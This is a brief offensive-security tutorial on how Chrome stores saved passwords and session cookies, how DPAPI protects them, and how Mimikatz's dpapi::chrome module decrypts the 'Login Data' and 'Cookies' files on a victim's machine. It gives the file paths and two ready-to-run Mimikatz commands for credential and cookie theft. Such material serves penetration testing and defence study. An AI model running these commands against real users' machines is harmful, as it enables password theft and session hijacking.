Mimikatz can extract saved passwords and session cookies from Chrome by exploiting how windows protects this data with the Data Protection API (DPAPI).

By default, Chrome stores sensitive data like session cookies and saved login credentials in two primary files:
- **Cookies**: Stores session cookies, often reused in pass-the-cookie attacks.
- **Login Data**: Contains saved usernames and passwords.

You can locate these files by navigating to:
```
%LOCALAPPDATA%\Google\Chrome\User Data\Default
```

#### Data Protection API
Chrome protects these files using the DPAPI, which ties encryption to a user's credentials. ***DPAPI encrypts sensitive data like cookies and passwords with a session key derived from a master key stored at***:
```
C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Protect\<user SID>\
```
These master keys are encrypted, and ***accessing them directly requires the user's password***.

Attackers can interact with the DPAPI encryption and decryption functions (`CryptProtectData` and `CryptUnprotectData`) directly, provided they have access to the user's environment.

Although tools exist to decrypt DPAPI-protected data, doing so usually requires being logged into the victim’s system. Without the user's password or master key, simply stealing these files and attempting to decrypt them on another machine won’t work.

#### Mimikatz to Decrypt Chrome Data
DPAPI module automates the decryption process for Chrome's stored data, provided the attacker has access to the victim's machine.
```
dpapi::chrome /in:"C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
dpapi::chrome /in:"C:\Users\USERNAME\AppData\Local\Google\Chrome\User Data\Default\Cookies" /unprotect
```

[DB Browser tool](https://sqlitebrowser.org/) to view the contents of the `Login Data` and `Cookies` files.